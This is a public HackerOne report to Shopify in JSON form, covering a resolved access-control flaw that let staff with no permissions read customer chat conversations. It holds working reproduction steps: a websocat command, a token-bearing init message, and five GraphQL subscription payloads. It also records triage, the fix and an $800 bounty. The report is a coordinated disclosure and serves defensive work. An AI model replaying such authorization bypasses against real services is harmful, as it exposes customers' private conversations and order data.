{"id":1023669,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDIzNjY5","url":"https://hackerone.com/reports/1023669","title":"Staff with no permissions can listen to Shopify Ping conversations by registering to its different WebSocket Events","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2020-10-31T23:47:39.526Z","submitted_at":"2020-10-31T23:47:39.541Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"francisbeaudoin","url":"/francisbeaudoin","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/apkjpoNQK4P5JD7rCFCB2hcf/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-19T20:11:37.668Z","bug_reporter_agreed_on_going_public_at":"2020-11-19T20:11:37.621Z","team_member_agreed_on_going_public_at":"2020-11-19T19:02:11.819Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"By registering to a few different Shopify Ping Websocket Events on the `wss://argus.shopifycloud.com/graphql?shop_id={id}` endpoint, a staff without any permission can listen to conversions with customers.\n\n## Steps to reproduce\n1. With a staff that doesn't have any permissions, login into the shop admin at `https://{shop}.myshopify.com/admin`\n1. Within your browser, open the Network inspection tab and copy the **argus token** value from the response of the **GetToken** operation that is being sent to `https://{shop}.myshopify.com/admin/internal/web/graphql/core`\n1. Using **websocat** command line tool or any other WebSocket client:\n\nOpen a connection\n ```\nwebsocat \"wss://argus.shopifycloud.com/graphql?shop_id={id}\"\n ```\n\nSend the authorization request by taking care of replacing the `{token}` with the actual value from **Step 2**\n ```\n{\"type\":\"connection_init\",\"payload\":{\"Authorization\":\"{token}\"}}\n```\n\nRegister to different Events\n```\n{\"id\":\"1\",\"type\":\"start\",\"payload\":{\"variables\":{\"eventName\":\"conversation\"},\"extensions\":{},\"operationName\":\"EventSubscription\",\"query\":\"subscription EventSubscription($eventName: String!) {\\n  eventReceived(eventName: $eventName) {\\n    eventName\\n    shopId\\n    eventTimestamp\\n    eventUuid\\n    eventId\\n    eventScope\\n    eventSerialGroup\\n    eventSerialId\\n    eventSourceApp\\n    eventSourceHost\\n    internalSessionId\\n    remoteIp\\n    requestId\\n    schemaVersion\\n    userId\\n    payload\\n    __typename\\n  }\\n}\\n\"}}\n```\n\n```\n{\"id\":\"2\",\"type\":\"start\",\"payload\":{\"variables\":{\"eventName\":\"message_status\"},\"extensions\":{},\"operationName\":\"EventSubscription\",\"query\":\"subscription EventSubscription($eventName: String!) {\\n  eventReceived(eventName: $eventName) {\\n    eventName\\n    shopId\\n    eventTimestamp\\n    eventUuid\\n    eventId\\n    eventScope\\n    eventSerialGroup\\n    eventSerialId\\n    eventSourceApp\\n    eventSourceHost\\n    internalSessionId\\n    remoteIp\\n    requestId\\n    schemaVersion\\n    userId\\n    payload\\n    __typename\\n  }\\n}\\n\"}}\n```\n\n```\n{\"id\":\"3\",\"type\":\"start\",\"payload\":{\"variables\":{\"eventName\":\"message\"},\"extensions\":{},\"operationName\":\"EventSubscription\",\"query\":\"subscription EventSubscription($eventName: String!) {\\n  eventReceived(eventName: $eventName) {\\n    eventName\\n    shopId\\n    eventTimestamp\\n    eventUuid\\n    eventId\\n    eventScope\\n    eventSerialGroup\\n    eventSerialId\\n    eventSourceApp\\n    eventSourceHost\\n    internalSessionId\\n    remoteIp\\n    requestId\\n    schemaVersion\\n    userId\\n    payload\\n    __typename\\n  }\\n}\\n\"}}\n```\n\n```\n{\"id\":\"4\",\"type\":\"start\",\"payload\":{\"variables\":{\"eventName\":\"participant\"},\"extensions\":{},\"operationName\":\"EventSubscription\",\"query\":\"subscription EventSubscription($eventName: String!) {\\n  eventReceived(eventName: $eventName) {\\n    eventName\\n    shopId\\n    eventTimestamp\\n    eventUuid\\n    eventId\\n    eventScope\\n    eventSerialGroup\\n    eventSerialId\\n    eventSourceApp\\n    eventSourceHost\\n    internalSessionId\\n    remoteIp\\n    requestId\\n    schemaVersion\\n    userId\\n    payload\\n    __typename\\n  }\\n}\\n\"}}\n```\n```\n{\"id\":\"5\",\"type\":\"start\",\"payload\":{\"variables\":{\"eventName\":\"read_state\"},\"extensions\":{},\"operationName\":\"EventSubscription\",\"query\":\"subscription EventSubscription($eventName: String!) {\\n  eventReceived(eventName: $eventName) {\\n    eventName\\n    shopId\\n    eventTimestamp\\n    eventUuid\\n    eventId\\n    eventScope\\n    eventSerialGroup\\n    eventSerialId\\n    eventSourceApp\\n    eventSourceHost\\n    internalSessionId\\n    remoteIp\\n    requestId\\n    schemaVersion\\n    userId\\n    payload\\n    __typename\\n  }\\n}\\n\"}}\n```\n \n4.Using your browser in Incognito, create a new Shopify Chat discussion by opening `https://{shop}.myshopify.com/?chat` and proceed with a customer order lookup operation\n 5.In your command line, observe that you'll be receiving any messages from that conversion along with the customer order status page link\n\n## Demo\n███████\n\n## Impact\n\nA staff without any permissions can listen to ongoing Shopify Ping conversions and therefore get access to some customer details and order informations.","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":22,"voters":["th3hidd3nmist","xploiterr","drsniper","th4nu_0x0","ali","mattberg","aphak5010","yinvi777","h4x0r_dz","f0rtr3ss","and 12 more..."],"structured_scope":{"databaseId":37198,"asset_type":"OTHER","asset_identifier":"Shopify Developed Apps","max_severity":"medium"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9703729,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"HI @francisbeaudoin \nThanks for your report - I read your report and watched your video but the video didn't match the reproduction steps. Before going through all the steps myself, I wanted to confirm - I noticed in the video, you show a no permission user and another user side by side. However, in the browser tools, you reply the request from the user which isn't the no permission user. Additionally, in the init request to the websocket, you have a JWT token - is that the argus token you're referring to? ","automated_response":false,"created_at":"2020-11-02T15:29:33.347Z","updated_at":"2020-11-02T15:29:33.347Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9704248,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hello @shopify-peteryaworski, \n\nSorry about the confusion. The steps in the video slightly differ from the reproduction steps but the end result is the same as the argus token coming from the GraphQL **GetToken** operation response is in fact the JWT token being used part of the authentication process with the WebSocket endpoint.\n\nSo, in the video, instead of taking the response back from the **GetToken** operation, I am using the authorization request that is being sent to the WebSocket (from the no permissions user). \n\nIf that's not clear in the video, the token is really coming from the no permissions user (hackerone-partnertest...) which is the right sided one on the screen.\n\nFor future reports, I'll make sure that my demo's are exactly matching the reproduction steps.","automated_response":false,"created_at":"2020-11-02T16:10:57.897Z","updated_at":"2020-11-02T16:15:13.268Z","actor":{"username":"francisbeaudoin","cleared":false,"url":"/francisbeaudoin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/apkjpoNQK4P5JD7rCFCB2hcf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9705482,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for clarifying. I'll take a look and get back to you.","automated_response":false,"created_at":"2020-11-02T17:53:07.344Z","updated_at":"2020-11-02T17:53:07.344Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9707757,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @francisbeaudoin \njust wanted to confirm I was able to replicate the behaviour - I'm just waiting to hear back from the engineering team with a final confirmation. I expect we'll have that update tomorrow.\n\nAdditionally, in the event it helps, I replicated the behaviour using Burp Suite. The websocket is created when a staff member logs in and Burp allows you to replay websocket requests in the repeater so I repeated a request from my low permissions user, sending the payloads you flagged. I found it easier than using `websocat`, I kept getting a `connection_error` that way, I assume because the JWT was already used. However, I didn't know about `websocat`, it looks like a cool tool.\n\nPete","automated_response":false,"created_at":"2020-11-02T22:04:33.022Z","updated_at":"2020-11-02T22:04:33.022Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9708856,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update and also for the hint with Burp Suite as I actually didn't know I could intercept WebSocket requests with it, that will be helpful!","automated_response":false,"created_at":"2020-11-03T02:07:10.718Z","updated_at":"2020-11-03T02:07:10.718Z","actor":{"username":"francisbeaudoin","cleared":false,"url":"/francisbeaudoin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/apkjpoNQK4P5JD7rCFCB2hcf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9714610,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks again for the report @francisbeaudoin.  Our engineering team confirmed the issue and is working on a fix.","automated_response":false,"created_at":"2020-11-03T14:26:33.763Z","updated_at":"2020-11-03T14:26:33.763Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9718925,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. Our engineering team has deployed a fix for this so the issue should no longer be reproducible. If you are able to bypass the fix, please let us know.\n\nThanks for helping make Shopify more secure. We hope you'll continue to do so. You can expect to hear from us about your bounty soon.\n\nHappy Hacking!","automated_response":false,"created_at":"2020-11-03T21:57:19.191Z","updated_at":"2020-11-03T21:57:19.191Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"francisbeaudoin","url":"/francisbeaudoin"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9718929,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","automated_response":false,"created_at":"2020-11-03T21:57:40.305Z","updated_at":"2020-11-03T21:57:40.305Z","additional_data":{"added_weaknesses":[{"id":18,"name":"Information Disclosure"}],"removed_weaknesses":[]},"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9719132,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @francisbeaudoin,\n\nThanks again for your report! We’re awarding a $800 bounty for this issue. Please find below our rationale generated using our [CVSS calculator](https://shopify.github.io/appsec/cvss_calculator/).\n\n## Base Score CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N 4.3\n## Environment: Non-Core (Modified by CR:L/IR:L/AR:L) 3.6\n\n#### Attack Complexity: L\n* Specific conditions to exploit?: Yes\n* Extensive effort to exploit?: No\n\n#### Privileges Required: L\n* Requires privileged account (not self-registered)?: Yes\n* Does the attacker need extensive permissions?: No\n\n#### User Interaction: N\n* Requires victim to perform some action during exploit?: No\n\n#### Scope: U\n* Can the attacker impact a separate service?: No\n\n#### Confidentiality: L\n* How much data could be accessed?: Some\n* How much of Shopify is impacted?: Most or All\n\n#### Integrity: N\n* How much data could be changed?: None\n\n#### Availability: N\n* Level of disruption to network service?: None\n","automated_response":false,"created_at":"2020-11-03T22:35:37.307Z","updated_at":"2020-11-03T22:35:37.307Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"francisbeaudoin","url":"/francisbeaudoin"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9720084,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fix looks good, thanks for the bounty!","automated_response":false,"created_at":"2020-11-04T00:52:30.901Z","updated_at":"2020-11-04T00:52:30.901Z","actor":{"username":"francisbeaudoin","cleared":false,"url":"/francisbeaudoin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/apkjpoNQK4P5JD7rCFCB2hcf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9725707,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Our pleasure @francisbeaudoin. Keep up the great work - you're doing great on our program! We really appreciate the time, effort and creativity. This was a nice find :)","automated_response":false,"created_at":"2020-11-04T16:50:14.099Z","updated_at":"2020-11-04T16:50:24.335Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9871468,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-11-19T19:02:11.851Z","updated_at":"2020-11-19T19:02:11.851Z","first_to_agree":true,"actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9872199,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-11-19T20:11:37.645Z","updated_at":"2020-11-19T20:11:37.645Z","actor":{"username":"francisbeaudoin","cleared":false,"url":"/francisbeaudoin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/apkjpoNQK4P5JD7rCFCB2hcf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9872200,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-11-19T20:11:37.699Z","updated_at":"2020-11-19T20:11:37.699Z","actor":{"username":"francisbeaudoin","cleared":false,"url":"/francisbeaudoin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/apkjpoNQK4P5JD7rCFCB2hcf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9898756,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2020-11-23T13:17:26.579Z","updated_at":"2020-11-23T13:17:26.579Z","additional_data":{"old_title":"Staff with no permissions can listen to Shopify Ping conversions by registering to its different WebSocket Events","new_title":"Staff with no permissions can listen to Shopify Ping conversations by registering to its different WebSocket Events"},"actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}